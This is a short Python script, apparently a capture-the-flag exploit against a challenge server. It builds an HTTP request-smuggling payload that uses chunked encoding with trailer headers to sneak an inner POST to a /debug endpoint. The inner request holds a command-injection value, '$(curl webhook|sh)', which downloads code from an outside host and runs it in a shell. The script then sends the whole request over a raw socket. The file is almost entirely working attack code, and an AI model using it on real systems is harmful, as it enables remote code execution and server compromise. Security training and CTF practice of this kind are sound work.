import socket

webhook = "webhook"
host = "trailing-danger.challs.m0lecon.it"

cmd = f'{{"ip":"::1%$(curl {webhook}|sh)"}}'

smug = f'POST /debug HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(cmd)}\r\n\r\n{cmd}'
req = f'POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n{len(smug):x}\r\n{smug}\r\n0\r\nContent-Length: 0\r\nTE: trailers\r\nConnection: x\r\n\r\n'

print(req)

try:
    sock = socket.create_connection((host, 33050), timeout=20)
    sock.sendall(req.encode())
except Exception as e:
    print('error', e)
finally:
    sock.close()